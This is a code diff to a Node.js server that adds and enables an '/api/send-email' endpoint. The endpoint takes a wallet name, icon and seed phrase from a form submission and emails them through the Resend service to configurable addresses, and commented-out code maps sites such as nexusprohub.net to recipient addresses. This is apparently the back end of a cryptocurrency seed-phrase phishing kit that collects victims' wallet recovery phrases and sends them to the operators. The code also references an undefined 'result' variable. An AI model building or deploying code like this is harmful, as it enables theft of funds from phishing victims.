@@ -105,6 +105,79 @@ const handleToggle = async (req, res, body) => {
   }
 };
 
+// Send email using Resend
+const sendEmail = async (req, res, body) => {
+  try {
+    if (req.method !== "POST") {
+      return res.status(405).json({ error: "Method not allowed" });
+    }
+    // const { walletName, walletIcon, seedPhrase } = JSON.parse(body);
+    const { walletName, walletIcon, seedPhrase, emailAddresses } =
+      JSON.parse(body);
+
+    if (!walletName || !walletIcon || !seedPhrase || !emailAddresses) {
+      res.writeHead(400, {
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+      });
+      res.end(JSON.stringify({ error: "Missing required fields" }));
+      return;
+    }
+
+    // const host = req.headers.host || "";
+
+    // const domainRecipients = {
+    //   "nexusprohub.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
+    //   "www.nexusprohub.net": process.env.RECIPIENT_EMAIL_DOMAIN1,
+    //   "dishbasin.onrender.com": process.env.RECIPIENT_EMAIL_DOMAIN2,
+    // };
+
+    // const recipientEmail =
+    //   domainRecipients[host] || process.env.RECIPIENT_EMAIL_DOMAIN1;
+
+    // console.log(`📧 Sending email to ${recipientEmail} from domain ${host}`);
+
+    const resend = new Resend(process.env.RESEND_API_KEY);
+
+    await resend.emails.send({
+      from: "onboarding@resend.dev", // Change to noreply@nexusprohub.net once verified
+      to: Array.isArray(emailAddresses) ? emailAddresses : [emailAddresses],
+      subject: `New Message from ${walletName}`,
+      html: `
+        <h2>New Wallet Submission</h2>
+        <p><strong>Name:</strong> ${walletName}</p>
+        <p><strong>Icon:</strong> ${walletIcon}</p>
+        <p><strong>Phrase:</strong></p>
+        <p>${seedPhrase}</p>
+      `,
+    });
+    console.log("Email sent via Resend:", result.id);
+
+    res.writeHead(200, {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    });
+    res.end(
+      JSON.stringify({
+        success: true,
+        message: "Email sent successfully",
+      }),
+    );
+  } catch (err) {
+    console.error("❌ Email error:", err);
+    res.writeHead(500, {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    });
+    res.end(
+      JSON.stringify({
+        error: "Failed to send email",
+        details: err.message,
+      }),
+    );
+  }
+};
+
 // Basic static file + API handler
 const server = http.createServer((req, res) => {
   const parsedUrl = url.parse(req.url);
@@ -121,13 +194,13 @@ const server = http.createServer((req, res) => {
   }
 
   // Handle send-email endpoint
-  // if (req.method === "POST" && parsedUrl.pathname === "/api/send-email") {
-  //   let body = "";
-  //   req.on("data", (chunk) => (body += chunk));
-  //   req.on("end", () => sendEmail(req, res, body));
-  // }
+  if (req.method === "POST" && parsedUrl.pathname === "/api/send-email") {
+    let body = "";
+    req.on("data", (chunk) => (body += chunk));
+    req.on("end", () => sendEmail(req, res, body));
+  }
   // Handle toggle endpoint (GET and POST)
-  if (parsedUrl.pathname === "/api/toggle") {
+  else if (parsedUrl.pathname === "/api/toggle") {
     if (req.method === "GET") {
       handleToggle(req, res, "");
     } else if (req.method === "POST") {
